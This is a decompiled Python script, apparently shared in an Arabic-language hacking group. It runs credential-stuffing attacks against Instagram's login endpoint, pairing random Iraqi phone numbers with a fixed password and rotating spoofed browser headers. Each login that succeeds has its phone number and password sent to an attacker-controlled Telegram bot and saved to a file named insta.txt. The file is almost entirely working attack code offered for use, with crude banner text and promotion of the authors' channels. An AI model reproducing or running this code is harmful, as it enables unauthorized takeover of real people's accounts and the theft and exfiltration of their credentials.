# uncompyle6 version 3.7.4
# Python bytecode 3.8
# Decompiled from: Python 3.8.3 (default, Jun 15 2020, 02:19:10)
# [GCC 9.3.0]
import webbrowser
webbrowser.open('https://t.me/DMW123')
import requests, os, random, json, threading, secrets, uuid
from colorama import Fore, Style
from secrets import token_hex
from uuid import uuid4
from user_agent import generate_user_agent
E = '\x1b[1;31m'
G = '\x1b[1;32m'
S = '\x1b[1;33m'
rs = '1'
if '1' == rs:
    print(G + 'Unlimited')
    print(G + 'الاداة باسم جيش القيادي تغير الحقوق طيزك بنشگ')
    ID = input(S + 'ايديك : ')
    token = input(G + ' توكن بوتك  : ')
    r = requests.Session()
    user = '1234567890'
    h = '+964'
    ww = '077'
    while True:
        us = str(''.join((random.choice(user) for i in range(8))))
        sa= str(''.join((random.choice(user) for i in range(0))))
        username = '+96477' + us
        password = '00998877' + sa
        url = 'https://www.instagram.com/accounts/login/ajax/'
        headers = {'accept':'*/*',
         'accept-encoding':'gzip,deflate,br',
         'accept-language':'en-US,en;q=0.9,ar;q=0.8',
         'content-length':'269',
         'content-type':'application/x-www-form-urlencoded',
         'cookie':'ig_did=77A45489-9A4C-43AD-9CA7-FA3FAB22FE24;ig_nrcb=1;csrftoken=VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8;mid=YGwlfgALAAEryeSgDseYghX2LAC-',
         'origin':'https://www.instagram.com',
         'referer':'https://www.instagram.com/',
         'sec-fetch-dest':'empty',
         'sec-fetch-mode':'cors',
         'sec-fetch-site':'same-origin',
         'user-agent':generate_user_agent(),
         'x-csrftoken':'VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8',
         'x-ig-app-id':'936619743392459',
         'x-ig-www-claim':'0',
         'x-instagram-ajax':'8a8118fa7d40',
         'x-requested-with':'XMLHttpRequest'}
        data = {'username':username,
         'enc_password':'#PWD_INSTAGRAM_BROWSER:0:1589682409:{}'.format(password),
         'queryParams':'{}',
         'optIntoOneTap':'false'}
        req_login = r.post(url, headers=headers, data=data, proxies=None)
        if 'userId' in req_login.text:
            tlg = f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=BY → @A_O_M_7 @II444KBOT  ✓\n𝑬𝒎𝑨𝒊𝑳 : [ → {username} ← ]\npassword : [ → {password} ← ]\n- 𝐅𝐫𝐎𝐦 : @A_O_M_7 - @II444K "
            i = requests.post(tlg)
            print(G + 'username ==> : ' + username + ': password ==> : ' + password)
            with open('insta.txt', 'a') as (HACKED):
                HACKED.write(' [-] UserName : {} \n [-] Passowrd : {} \n\n'.format(username, password))
        else:
            print(E + 'username ==> : ' + username + ': password ==> : ' + password)

else:
    print('')
    print('معرف المطورين')
    print('@II444K @III444KBOT \n@A_O_M_7')